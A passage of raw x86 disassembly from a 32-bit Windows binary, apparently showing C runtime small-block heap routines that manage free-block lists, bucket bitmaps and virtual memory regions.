  404dd1:	8b 13                	mov    (%ebx),%edx
  404dd3:	89 55 f4             	mov    %edx,-0xc(%ebp)
  404dd6:	8b 56 fc             	mov    -0x4(%esi),%edx
  404dd9:	89 55 f8             	mov    %edx,-0x8(%ebp)
  404ddc:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404ddf:	f6 c2 01             	test   $0x1,%dl
  404de2:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  404de5:	75 74                	jne    0x404e5b
  404de7:	c1 fa 04             	sar    $0x4,%edx
  404dea:	4a                   	dec    %edx
  404deb:	83 fa 3f             	cmp    $0x3f,%edx
  404dee:	76 03                	jbe    0x404df3
  404df0:	6a 3f                	push   $0x3f
  404df2:	5a                   	pop    %edx
  404df3:	8b 4b 04             	mov    0x4(%ebx),%ecx
  404df6:	3b 4b 08             	cmp    0x8(%ebx),%ecx
  404df9:	75 42                	jne    0x404e3d
  404dfb:	83 fa 20             	cmp    $0x20,%edx
  404dfe:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  404e03:	73 19                	jae    0x404e1e
  404e05:	8b ca                	mov    %edx,%ecx
  404e07:	d3 eb                	shr    %cl,%ebx
  404e09:	8d 4c 02 04          	lea    0x4(%edx,%eax,1),%ecx
  404e0d:	f7 d3                	not    %ebx
  404e0f:	21 5c b8 44          	and    %ebx,0x44(%eax,%edi,4)
  404e13:	fe 09                	decb   (%ecx)
  404e15:	75 23                	jne    0x404e3a
  404e17:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404e1a:	21 19                	and    %ebx,(%ecx)
  404e1c:	eb 1c                	jmp    0x404e3a
  404e1e:	8d 4a e0             	lea    -0x20(%edx),%ecx
  404e21:	d3 eb                	shr    %cl,%ebx
  404e23:	8d 4c 02 04          	lea    0x4(%edx,%eax,1),%ecx
  404e27:	f7 d3                	not    %ebx
  404e29:	21 9c b8 c4 00 00 00 	and    %ebx,0xc4(%eax,%edi,4)
  404e30:	fe 09                	decb   (%ecx)
  404e32:	75 06                	jne    0x404e3a
  404e34:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404e37:	21 59 04             	and    %ebx,0x4(%ecx)
  404e3a:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404e3d:	8b 53 08             	mov    0x8(%ebx),%edx
  404e40:	8b 5b 04             	mov    0x4(%ebx),%ebx
  404e43:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404e46:	03 4d f4             	add    -0xc(%ebp),%ecx
  404e49:	89 5a 04             	mov    %ebx,0x4(%edx)
  404e4c:	8b 55 0c             	mov    0xc(%ebp),%edx
  404e4f:	8b 5a 04             	mov    0x4(%edx),%ebx
  404e52:	8b 52 08             	mov    0x8(%edx),%edx
  404e55:	89 53 08             	mov    %edx,0x8(%ebx)
  404e58:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404e5b:	8b d1                	mov    %ecx,%edx
  404e5d:	c1 fa 04             	sar    $0x4,%edx
  404e60:	4a                   	dec    %edx
  404e61:	83 fa 3f             	cmp    $0x3f,%edx
  404e64:	76 03                	jbe    0x404e69
  404e66:	6a 3f                	push   $0x3f
  404e68:	5a                   	pop    %edx
  404e69:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  404e6c:	83 e3 01             	and    $0x1,%ebx
  404e6f:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  404e72:	0f 85 8f 00 00 00    	jne    0x404f07
  404e78:	2b 75 f8             	sub    -0x8(%ebp),%esi
  404e7b:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  404e7e:	c1 fb 04             	sar    $0x4,%ebx
  404e81:	6a 3f                	push   $0x3f
  404e83:	89 75 0c             	mov    %esi,0xc(%ebp)
  404e86:	4b                   	dec    %ebx
  404e87:	5e                   	pop    %esi
  404e88:	3b de                	cmp    %esi,%ebx
  404e8a:	76 02                	jbe    0x404e8e
  404e8c:	8b de                	mov    %esi,%ebx
  404e8e:	03 4d f8             	add    -0x8(%ebp),%ecx
  404e91:	8b d1                	mov    %ecx,%edx
  404e93:	c1 fa 04             	sar    $0x4,%edx
  404e96:	4a                   	dec    %edx
  404e97:	3b d6                	cmp    %esi,%edx
  404e99:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404e9c:	76 02                	jbe    0x404ea0
  404e9e:	8b d6                	mov    %esi,%edx
  404ea0:	3b da                	cmp    %edx,%ebx
  404ea2:	74 5e                	je     0x404f02
  404ea4:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404ea7:	8b 71 04             	mov    0x4(%ecx),%esi
  404eaa:	3b 71 08             	cmp    0x8(%ecx),%esi
  404ead:	75 3b                	jne    0x404eea
  404eaf:	83 fb 20             	cmp    $0x20,%ebx
  404eb2:	be 00 00 00 80       	mov    $0x80000000,%esi
  404eb7:	73 17                	jae    0x404ed0
  404eb9:	8b cb                	mov    %ebx,%ecx
  404ebb:	d3 ee                	shr    %cl,%esi
  404ebd:	f7 d6                	not    %esi
  404ebf:	21 74 b8 44          	and    %esi,0x44(%eax,%edi,4)
  404ec3:	fe 4c 03 04          	decb   0x4(%ebx,%eax,1)
  404ec7:	75 21                	jne    0x404eea
  404ec9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404ecc:	21 31                	and    %esi,(%ecx)
  404ece:	eb 1a                	jmp    0x404eea
  404ed0:	8d 4b e0             	lea    -0x20(%ebx),%ecx
  404ed3:	d3 ee                	shr    %cl,%esi
  404ed5:	f7 d6                	not    %esi
  404ed7:	21 b4 b8 c4 00 00 00 	and    %esi,0xc4(%eax,%edi,4)
  404ede:	fe 4c 03 04          	decb   0x4(%ebx,%eax,1)
  404ee2:	75 06                	jne    0x404eea
  404ee4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404ee7:	21 71 04             	and    %esi,0x4(%ecx)
  404eea:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404eed:	8b 71 08             	mov    0x8(%ecx),%esi
  404ef0:	8b 49 04             	mov    0x4(%ecx),%ecx
  404ef3:	89 4e 04             	mov    %ecx,0x4(%esi)
  404ef6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404ef9:	8b 71 04             	mov    0x4(%ecx),%esi
  404efc:	8b 49 08             	mov    0x8(%ecx),%ecx
  404eff:	89 4e 08             	mov    %ecx,0x8(%esi)
  404f02:	8b 75 0c             	mov    0xc(%ebp),%esi
  404f05:	eb 03                	jmp    0x404f0a
  404f07:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404f0a:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  404f0e:	75 08                	jne    0x404f18
  404f10:	3b da                	cmp    %edx,%ebx
  404f12:	0f 84 80 00 00 00    	je     0x404f98
  404f18:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f1b:	8d 0c d1             	lea    (%ecx,%edx,8),%ecx
  404f1e:	8b 59 04             	mov    0x4(%ecx),%ebx
  404f21:	89 4e 08             	mov    %ecx,0x8(%esi)
  404f24:	89 5e 04             	mov    %ebx,0x4(%esi)
  404f27:	89 71 04             	mov    %esi,0x4(%ecx)
  404f2a:	8b 4e 04             	mov    0x4(%esi),%ecx
  404f2d:	89 71 08             	mov    %esi,0x8(%ecx)
  404f30:	8b 4e 04             	mov    0x4(%esi),%ecx
  404f33:	3b 4e 08             	cmp    0x8(%esi),%ecx
  404f36:	75 60                	jne    0x404f98
  404f38:	8a 4c 02 04          	mov    0x4(%edx,%eax,1),%cl
  404f3c:	88 4d 0f             	mov    %cl,0xf(%ebp)
  404f3f:	fe c1                	inc    %cl
  404f41:	83 fa 20             	cmp    $0x20,%edx
  404f44:	88 4c 02 04          	mov    %cl,0x4(%edx,%eax,1)
  404f48:	73 25                	jae    0x404f6f
  404f4a:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  404f4e:	75 0e                	jne    0x404f5e
  404f50:	8b ca                	mov    %edx,%ecx
  404f52:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  404f57:	d3 eb                	shr    %cl,%ebx
  404f59:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404f5c:	09 19                	or     %ebx,(%ecx)
  404f5e:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  404f63:	8b ca                	mov    %edx,%ecx
  404f65:	d3 eb                	shr    %cl,%ebx
  404f67:	8d 44 b8 44          	lea    0x44(%eax,%edi,4),%eax
  404f6b:	09 18                	or     %ebx,(%eax)
  404f6d:	eb 29                	jmp    0x404f98
  404f6f:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  404f73:	75 10                	jne    0x404f85
  404f75:	8d 4a e0             	lea    -0x20(%edx),%ecx
  404f78:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  404f7d:	d3 eb                	shr    %cl,%ebx
  404f7f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404f82:	09 59 04             	or     %ebx,0x4(%ecx)
  404f85:	8d 4a e0             	lea    -0x20(%edx),%ecx
  404f88:	ba 00 00 00 80       	mov    $0x80000000,%edx
  404f8d:	d3 ea                	shr    %cl,%edx
  404f8f:	8d 84 b8 c4 00 00 00 	lea    0xc4(%eax,%edi,4),%eax
  404f96:	09 10                	or     %edx,(%eax)
  404f98:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404f9b:	89 06                	mov    %eax,(%esi)
  404f9d:	89 44 30 fc          	mov    %eax,-0x4(%eax,%esi,1)
  404fa1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404fa4:	ff 08                	decl   (%eax)
  404fa6:	0f 85 f3 00 00 00    	jne    0x40509f
  404fac:	a1 98 d5 40 00       	mov    0x40d598,%eax
  404fb1:	85 c0                	test   %eax,%eax
  404fb3:	0f 84 d8 00 00 00    	je     0x405091
  404fb9:	8b 0d f4 d8 40 00    	mov    0x40d8f4,%ecx
  404fbf:	8b 35 14 91 40 00    	mov    0x409114,%esi
  404fc5:	68 00 40 00 00       	push   $0x4000
  404fca:	c1 e1 0f             	shl    $0xf,%ecx
  404fcd:	03 48 0c             	add    0xc(%eax),%ecx
  404fd0:	bb 00 80 00 00       	mov    $0x8000,%ebx
  404fd5:	53                   	push   %ebx
  404fd6:	51                   	push   %ecx
  404fd7:	ff d6                	call   *%esi
  404fd9:	8b 0d f4 d8 40 00    	mov    0x40d8f4,%ecx
  404fdf:	a1 98 d5 40 00       	mov    0x40d598,%eax
  404fe4:	ba 00 00 00 80       	mov    $0x80000000,%edx
  404fe9:	d3 ea                	shr    %cl,%edx
  404feb:	09 50 08             	or     %edx,0x8(%eax)
  404fee:	a1 98 d5 40 00       	mov    0x40d598,%eax
  404ff3:	8b 40 10             	mov    0x10(%eax),%eax
  404ff6:	8b 0d f4 d8 40 00    	mov    0x40d8f4,%ecx
  404ffc:	83 a4 88 c4 00 00 00 	andl   $0x0,0xc4(%eax,%ecx,4)
  405003:	00 
  405004:	a1 98 d5 40 00       	mov    0x40d598,%eax
  405009:	8b 40 10             	mov    0x10(%eax),%eax
  40500c:	fe 48 43             	decb   0x43(%eax)
  40500f:	a1 98 d5 40 00       	mov    0x40d598,%eax
  405014:	8b 48 10             	mov    0x10(%eax),%ecx
  405017:	80 79 43 00          	cmpb   $0x0,0x43(%ecx)
  40501b:	75 09                	jne    0x405026
  40501d:	83 60 04 fe          	andl   $0xfffffffe,0x4(%eax)
  405021:	a1 98 d5 40 00       	mov    0x40d598,%eax
  405026:	83 78 08 ff          	cmpl   $0xffffffff,0x8(%eax)
  40502a:	75 65                	jne    0x405091
  40502c:	53                   	push   %ebx
  40502d:	6a 00                	push   $0x0
  40502f:	ff 70 0c             	push   0xc(%eax)
  405032:	ff d6                	call   *%esi
  405034:	a1 98 d5 40 00       	mov    0x40d598,%eax
  405039:	ff 70 10             	push   0x10(%eax)
  40503c:	6a 00                	push   $0x0
  40503e:	ff 35 94 d5 40 00    	push   0x40d594
  405044:	ff 15 cc 90 40 00    	call   *0x4090cc
  40504a:	8b 0d e0 d8 40 00    	mov    0x40d8e0,%ecx
  405050:	a1 98 d5 40 00       	mov    0x40d598,%eax
  405055:	6b c9 14             	imul   $0x14,%ecx,%ecx
  405058:	8b 15 e4 d8 40 00    	mov    0x40d8e4,%edx
  40505e:	2b c8                	sub    %eax,%ecx
  405060:	8d 4c 11 ec          	lea    -0x14(%ecx,%edx,1),%ecx
  405064:	51                   	push   %ecx
  405065:	8d 48 14             	lea    0x14(%eax),%ecx
  405068:	51                   	push   %ecx
  405069:	50                   	push   %eax
  40506a:	e8 91 23 00 00       	call   0x407400
  40506f:	8b 45 08             	mov    0x8(%ebp),%eax
  405072:	83 c4 0c             	add    $0xc,%esp
  405075:	ff 0d e0 d8 40 00    	decl   0x40d8e0
  40507b:	3b 05 98 d5 40 00    	cmp    0x40d598,%eax
  405081:	76 04                	jbe    0x405087
  405083:	83 6d 08 14          	subl   $0x14,0x8(%ebp)
  405087:	a1 e4 d8 40 00       	mov    0x40d8e4,%eax
  40508c:	a3 ec d8 40 00       	mov    %eax,0x40d8ec
  405091:	8b 45 08             	mov    0x8(%ebp),%eax
  405094:	a3 98 d5 40 00       	mov    %eax,0x40d598
  405099:	89 3d f4 d8 40 00    	mov    %edi,0x40d8f4
  40509f:	5b                   	pop    %ebx
  4050a0:	5f                   	pop    %edi
  4050a1:	5e                   	pop    %esi
  4050a2:	c9                   	leave
  4050a3:	c3                   	ret
  4050a4:	a1 f0 d8 40 00       	mov    0x40d8f0,%eax
  4050a9:	56                   	push   %esi
  4050aa:	8b 35 e0 d8 40 00    	mov    0x40d8e0,%esi
  4050b0:	57                   	push   %edi
  4050b1:	33 ff                	xor    %edi,%edi
  4050b3:	3b f0                	cmp    %eax,%esi
  4050b5:	75 34                	jne    0x4050eb
  4050b7:	83 c0 10             	add    $0x10,%eax
  4050ba:	6b c0 14             	imul   $0x14,%eax,%eax
  4050bd:	50                   	push   %eax
  4050be:	ff 35 e4 d8 40 00    	push   0x40d8e4
  4050c4:	57                   	push   %edi
  4050c5:	ff 35 94 d5 40 00    	push   0x40d594
  4050cb:	ff 15 1c 91 40 00    	call   *0x40911c
  4050d1:	3b c7                	cmp    %edi,%eax
  4050d3:	75 04                	jne    0x4050d9
  4050d5:	33 c0                	xor    %eax,%eax
  4050d7:	eb 78                	jmp    0x405151
  4050d9:	83 05 f0 d8 40 00 10 	addl   $0x10,0x40d8f0
  4050e0:	8b 35 e0 d8 40 00    	mov    0x40d8e0,%esi
  4050e6:	a3 e4 d8 40 00       	mov    %eax,0x40d8e4
  4050eb:	6b f6 14             	imul   $0x14,%esi,%esi
  4050ee:	03 35 e4 d8 40 00    	add    0x40d8e4,%esi
  4050f4:	68 c4 41 00 00       	push   $0x41c4
  4050f9:	6a 08                	push   $0x8
  4050fb:	ff 35 94 d5 40 00    	push   0x40d594
  405101:	ff 15 d0 90 40 00    	call   *0x4090d0
  405107:	3b c7                	cmp    %edi,%eax
  405109:	89 46 10             	mov    %eax,0x10(%esi)
  40510c:	74 c7                	je     0x4050d5
  40510e:	6a 04                	push   $0x4
  405110:	68 00 20 00 00       	push   $0x2000
  405115:	68 00 00 10 00       	push   $0x100000
  40511a:	57                   	push   %edi
  40511b:	ff 15 18 91 40 00    	call   *0x409118
  405121:	3b c7                	cmp    %edi,%eax
  405123:	89 46 0c             	mov    %eax,0xc(%esi)
  405126:	75 12                	jne    0x40513a
  405128:	ff 76 10             	push   0x10(%esi)
  40512b:	57                   	push   %edi
  40512c:	ff 35 94 d5 40 00    	push   0x40d594
  405132:	ff 15 cc 90 40 00    	call   *0x4090cc
  405138:	eb 9b                	jmp    0x4050d5
  40513a:	83 4e 08 ff          	orl    $0xffffffff,0x8(%esi)
  40513e:	89 3e                	mov    %edi,(%esi)
  405140:	89 7e 04             	mov    %edi,0x4(%esi)
  405143:	ff 05 e0 d8 40 00    	incl   0x40d8e0
  405149:	8b 46 10             	mov    0x10(%esi),%eax
  40514c:	83 08 ff             	orl    $0xffffffff,(%eax)
  40514f:	8b c6                	mov    %esi,%eax
  405151:	5f                   	pop    %edi
  405152:	5e                   	pop    %esi
  405153:	c3                   	ret
  405154:	55                   	push   %ebp
  405155:	8b ec                	mov    %esp,%ebp
  405157:	51                   	push   %ecx
  405158:	51                   	push   %ecx
  405159:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40515c:	8b 41 08             	mov    0x8(%ecx),%eax
  40515f:	53                   	push   %ebx
  405160:	56                   	push   %esi
  405161:	8b 71 10             	mov    0x10(%ecx),%esi
  405164:	57                   	push   %edi
  405165:	33 db                	xor    %ebx,%ebx
  405167:	eb 03                	jmp    0x40516c
  405169:	03 c0                	add    %eax,%eax
  40516b:	43                   	inc    %ebx
  40516c:	85 c0                	test   %eax,%eax
  40516e:	7d f9                	jge    0x405169
  405170:	8b c3                	mov    %ebx,%eax
  405172:	69 c0 04 02 00 00    	imul   $0x204,%eax,%eax
  405178:	8d 84 30 44 01 00 00 	lea    0x144(%eax,%esi,1),%eax
  40517f:	6a 3f                	push   $0x3f
  405181:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405184:	5a                   	pop    %edx
  405185:	89 40 08             	mov    %eax,0x8(%eax)
  405188:	89 40 04             	mov    %eax,0x4(%eax)
  40518b:	83 c0 08             	add    $0x8,%eax
  40518e:	4a                   	dec    %edx
  40518f:	75 f4                	jne    0x405185
  405191:	6a 04                	push   $0x4
  405193:	8b fb                	mov    %ebx,%edi
  405195:	68 00 10 00 00       	push   $0x1000
  40519a:	c1 e7 0f             	shl    $0xf,%edi
  40519d:	03 79 0c             	add    0xc(%ecx),%edi
  4051a0:	68 00 80 00 00       	push   $0x8000
  4051a5:	57                   	push   %edi
  4051a6:	ff 15 18 91 40 00    	call   *0x409118
  4051ac:	85 c0                	test   %eax,%eax
  4051ae:	75 08                	jne    0x4051b8
  4051b0:	83 c8 ff             	or     $0xffffffff,%eax
  4051b3:	e9 9d 00 00 00       	jmp    0x405255
  4051b8:	8d 97 00 70 00 00    	lea    0x7000(%edi),%edx
  4051be:	3b fa                	cmp    %edx,%edi
  4051c0:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4051c3:	77 43                	ja     0x405208
  4051c5:	8b ca                	mov    %edx,%ecx
  4051c7:	2b cf                	sub    %edi,%ecx
  4051c9:	c1 e9 0c             	shr    $0xc,%ecx
  4051cc:	8d 47 10             	lea    0x10(%edi),%eax
  4051cf:	41                   	inc    %ecx
  4051d0:	83 48 f8 ff          	orl    $0xffffffff,-0x8(%eax)
  4051d4:	83 88 ec 0f 00 00 ff 	orl    $0xffffffff,0xfec(%eax)
  4051db:	8d 90 fc 0f 00 00    	lea    0xffc(%eax),%edx
  4051e1:	89 10                	mov    %edx,(%eax)
  4051e3:	8d 90 fc ef ff ff    	lea    -0x1004(%eax),%edx
  4051e9:	c7 40 fc f0 0f 00 00 	movl   $0xff0,-0x4(%eax)
  4051f0:	89 50 04             	mov    %edx,0x4(%eax)
  4051f3:	c7 80 e8 0f 00 00 f0 	movl   $0xff0,0xfe8(%eax)
  4051fa:	0f 00 00 
  4051fd:	05 00 10 00 00       	add    $0x1000,%eax
  405202:	49                   	dec    %ecx
  405203:	75 cb                	jne    0x4051d0
  405205:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405208:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40520b:	05 f8 01 00 00       	add    $0x1f8,%eax
  405210:	8d 4f 0c             	lea    0xc(%edi),%ecx
  405213:	89 48 04             	mov    %ecx,0x4(%eax)
  405216:	89 41 08             	mov    %eax,0x8(%ecx)
  405219:	8d 4a 0c             	lea    0xc(%edx),%ecx
  40521c:	89 48 08             	mov    %ecx,0x8(%eax)
  40521f:	89 41 04             	mov    %eax,0x4(%ecx)
  405222:	83 64 9e 44 00       	andl   $0x0,0x44(%esi,%ebx,4)
  405227:	33 ff                	xor    %edi,%edi
  405229:	47                   	inc    %edi
  40522a:	89 bc 9e c4 00 00 00 	mov    %edi,0xc4(%esi,%ebx,4)
  405231:	8a 46 43             	mov    0x43(%esi),%al
  405234:	8a c8                	mov    %al,%cl
  405236:	fe c1                	inc    %cl
  405238:	84 c0                	test   %al,%al
  40523a:	8b 45 08             	mov    0x8(%ebp),%eax
  40523d:	88 4e 43             	mov    %cl,0x43(%esi)
  405240:	75 03                	jne    0x405245
  405242:	09 78 04             	or     %edi,0x4(%eax)
  405245:	ba 00 00 00 80       	mov    $0x80000000,%edx
  40524a:	8b cb                	mov    %ebx,%ecx
  40524c:	d3 ea                	shr    %cl,%edx
  40524e:	f7 d2                	not    %edx
  405250:	21 50 08             	and    %edx,0x8(%eax)
  405253:	8b c3                	mov    %ebx,%eax
  405255:	5f                   	pop    %edi
  405256:	5e                   	pop    %esi
  405257:	5b                   	pop    %ebx
  405258:	c9                   	leave
  405259:	c3                   	ret
  40525a:	55                   	push   %ebp
  40525b:	8b ec                	mov    %esp,%ebp
  40525d:	83 ec 0c             	sub    $0xc,%esp
  405260:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405263:	8b 41 10             	mov    0x10(%ecx),%eax
  405266:	53                   	push   %ebx
  405267:	56                   	push   %esi
  405268:	8b 75 10             	mov    0x10(%ebp),%esi
  40526b:	57                   	push   %edi
  40526c:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40526f:	8b d7                	mov    %edi,%edx
  405271:	2b 51 0c             	sub    0xc(%ecx),%edx
  405274:	83 c6 17             	add    $0x17,%esi
  405277:	c1 ea 0f             	shr    $0xf,%edx
  40527a:	8b ca                	mov    %edx,%ecx
  40527c:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  405282:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  405289:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40528c:	8b 4f fc             	mov    -0x4(%edi),%ecx
  40528f:	83 e6 f0             	and    $0xfffffff0,%esi
  405292:	49                   	dec    %ecx
  405293:	3b f1                	cmp    %ecx,%esi
  405295:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  405299:	8b 1f                	mov    (%edi),%ebx
  40529b:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40529e:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4052a1:	0f 8e 55 01 00 00    	jle    0x4053fc
  4052a7:	f6 c3 01             	test   $0x1,%bl
  4052aa:	0f 85 45 01 00 00    	jne    0x4053f5
  4052b0:	03 d9                	add    %ecx,%ebx
  4052b2:	3b f3                	cmp    %ebx,%esi
  4052b4:	0f 8f 3b 01 00 00    	jg     0x4053f5
  4052ba:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4052bd:	c1 f9 04             	sar    $0x4,%ecx
  4052c0:	49                   	dec    %ecx
  4052c1:	83 f9 3f             	cmp    $0x3f,%ecx
  4052c4:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4052c7:	76 06                	jbe    0x4052cf
  4052c9:	6a 3f                	push   $0x3f
  4052cb:	59                   	pop    %ecx
  4052cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4052cf:	8b 5f 04             	mov    0x4(%edi),%ebx
  4052d2:	3b 5f 08             	cmp    0x8(%edi),%ebx
  4052d5:	75 43                	jne    0x40531a
  4052d7:	83 f9 20             	cmp    $0x20,%ecx
  4052da:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  4052df:	73 1a                	jae    0x4052fb
  4052e1:	d3 eb                	shr    %cl,%ebx
  4052e3:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4052e6:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  4052ea:	f7 d3                	not    %ebx
  4052ec:	21 5c 90 44          	and    %ebx,0x44(%eax,%edx,4)
  4052f0:	fe 09                	decb   (%ecx)
  4052f2:	75 26                	jne    0x40531a
  4052f4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4052f7:	21 19                	and    %ebx,(%ecx)
  4052f9:	eb 1f                	jmp    0x40531a
  4052fb:	83 c1 e0             	add    $0xffffffe0,%ecx
  4052fe:	d3 eb                	shr    %cl,%ebx
  405300:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405303:	8d 4c 01 04          	lea    0x4(%ecx,%eax,1),%ecx
  405307:	f7 d3                	not    %ebx
  405309:	21 9c 90 c4 00 00 00 	and    %ebx,0xc4(%eax,%edx,4)
  405310:	fe 09                	decb   (%ecx)
  405312:	75 06                	jne    0x40531a
  405314:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405317:	21 59 04             	and    %ebx,0x4(%ecx)
  40531a:	8b 4f 08             	mov    0x8(%edi),%ecx
  40531d:	8b 5f 04             	mov    0x4(%edi),%ebx
  405320:	89 59 04             	mov    %ebx,0x4(%ecx)
  405323:	8b 4f 04             	mov    0x4(%edi),%ecx
  405326:	8b 7f 08             	mov    0x8(%edi),%edi
  405329:	89 79 08             	mov    %edi,0x8(%ecx)
  40532c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40532f:	2b ce                	sub    %esi,%ecx
  405331:	01 4d fc             	add    %ecx,-0x4(%ebp)
  405334:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  405338:	0f 8e a5 00 00 00    	jle    0x4053e3
  40533e:	8b 7d fc             	mov    -0x4(%ebp),%edi
  405341:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405344:	c1 ff 04             	sar    $0x4,%edi
  405347:	4f                   	dec    %edi
  405348:	83 ff 3f             	cmp    $0x3f,%edi
  40534b:	8d 4c 31 fc          	lea    -0x4(%ecx,%esi,1),%ecx
  40534f:	76 03                	jbe    0x405354
  405351:	6a 3f                	push   $0x3f
  405353:	5f                   	pop    %edi
  405354:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  405357:	8d 1c fb             	lea    (%ebx,%edi,8),%ebx
  40535a:	89 5d 10             	mov    %ebx,0x10(%ebp)
  40535d:	8b 5b 04             	mov    0x4(%ebx),%ebx
  405360:	89 59 04             	mov    %ebx,0x4(%ecx)
  405363:	8b 5d 10             	mov    0x10(%ebp),%ebx
  405366:	89 59 08             	mov    %ebx,0x8(%ecx)
  405369:	89 4b 04             	mov    %ecx,0x4(%ebx)
  40536c:	8b 59 04             	mov    0x4(%ecx),%ebx
  40536f:	89 4b 08             	mov    %ecx,0x8(%ebx)
  405372:	8b 59 04             	mov    0x4(%ecx),%ebx
  405375:	3b 59 08             	cmp    0x8(%ecx),%ebx
  405378:	75 57                	jne    0x4053d1
  40537a:	8a 4c 07 04          	mov    0x4(%edi,%eax,1),%cl
  40537e:	88 4d 13             	mov    %cl,0x13(%ebp)
  405381:	fe c1                	inc    %cl
  405383:	83 ff 20             	cmp    $0x20,%edi
  405386:	88 4c 07 04          	mov    %cl,0x4(%edi,%eax,1)
  40538a:	73 1c                	jae    0x4053a8
  40538c:	80 7d 13 00          	cmpb   $0x0,0x13(%ebp)
  405390:	75 0e                	jne    0x4053a0
  405392:	8b cf                	mov    %edi,%ecx
  405394:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  405399:	d3 eb                	shr    %cl,%ebx
  40539b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40539e:	09 19                	or     %ebx,(%ecx)
  4053a0:	8d 44 90 44          	lea    0x44(%eax,%edx,4),%eax
  4053a4:	8b cf                	mov    %edi,%ecx
  4053a6:	eb 20                	jmp    0x4053c8
  4053a8:	80 7d 13 00          	cmpb   $0x0,0x13(%ebp)
  4053ac:	75 10                	jne    0x4053be
  4053ae:	8d 4f e0             	lea    -0x20(%edi),%ecx
  4053b1:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  4053b6:	d3 eb                	shr    %cl,%ebx
  4053b8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4053bb:	09 59 04             	or     %ebx,0x4(%ecx)
  4053be:	8d 84 90 c4 00 00 00 	lea    0xc4(%eax,%edx,4),%eax
  4053c5:	8d 4f e0             	lea    -0x20(%edi),%ecx
  4053c8:	ba 00 00 00 80       	mov    $0x80000000,%edx
  4053cd:	d3 ea                	shr    %cl,%edx
  4053cf:	09 10                	or     %edx,(%eax)
  4053d1:	8b 55 0c             	mov    0xc(%ebp),%edx
  4053d4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4053d7:	8d 44 32 fc          	lea    -0x4(%edx,%esi,1),%eax
  4053db:	89 08                	mov    %ecx,(%eax)
  4053dd:	89 4c 01 fc          	mov    %ecx,-0x4(%ecx,%eax,1)
  4053e1:	eb 03                	jmp    0x4053e6
  4053e3:	8b 55 0c             	mov    0xc(%ebp),%edx
  4053e6:	8d 46 01             	lea    0x1(%esi),%eax
  4053e9:	89 42 fc             	mov    %eax,-0x4(%edx)
  4053ec:	89 44 32 f8          	mov    %eax,-0x8(%edx,%esi,1)
  4053f0:	e9 3c 01 00 00       	jmp    0x405531
  4053f5:	33 c0                	xor    %eax,%eax
  4053f7:	e9 38 01 00 00       	jmp    0x405534
  4053fc:	0f 8d 2f 01 00 00    	jge    0x405531
  405402:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405405:	29 75 10             	sub    %esi,0x10(%ebp)
  405408:	8d 4e 01             	lea    0x1(%esi),%ecx
  40540b:	89 4b fc             	mov    %ecx,-0x4(%ebx)
  40540e:	8d 5c 33 fc          	lea    -0x4(%ebx,%esi,1),%ebx
  405412:	8b 75 10             	mov    0x10(%ebp),%esi
  405415:	c1 fe 04             	sar    $0x4,%esi
  405418:	4e                   	dec    %esi
  405419:	83 fe 3f             	cmp    $0x3f,%esi
  40541c:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  40541f:	89 4b fc             	mov    %ecx,-0x4(%ebx)
  405422:	76 03                	jbe    0x405427
  405424:	6a 3f                	push   $0x3f
  405426:	5e                   	pop    %esi
  405427:	f6 45 fc 01          	testb  $0x1,-0x4(%ebp)
